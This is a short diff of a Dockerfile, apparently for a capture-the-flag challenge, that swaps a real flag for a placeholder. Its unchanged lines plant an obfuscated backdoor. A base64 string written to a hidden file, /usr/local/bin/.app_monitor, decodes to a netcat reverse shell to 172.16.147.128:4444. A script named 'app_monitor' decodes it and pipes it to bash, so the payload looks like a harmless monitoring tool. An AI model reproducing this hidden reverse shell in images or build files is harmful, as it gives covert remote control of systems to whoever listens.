@@ -25,7 +25,7 @@ RUN npm install
 
 COPY . .
 
-RUN echo 'CBJS{SstI_EjS_BuG}' > /root/.flag
+RUN echo 'CBJS{FaKe_fLaG_fAkE_FlAG}' > /root/.flag
 
 RUN echo 'IyEvYmluL2Jhc2hcbi9iaW4vbmMgLWUgL2Jpbi9iYXNoIDE3Mi4xNi4xNDcuMTI4IDQ0NDQgMj4vZGV2L251bGw=' > /usr/local/bin/.app_monitor
 RUN echo $'#!/bin/bash\necho "$(cat /usr/local/bin/.app_monitor | base64 -d)" | bash' > /usr/local/bin/app_monitor
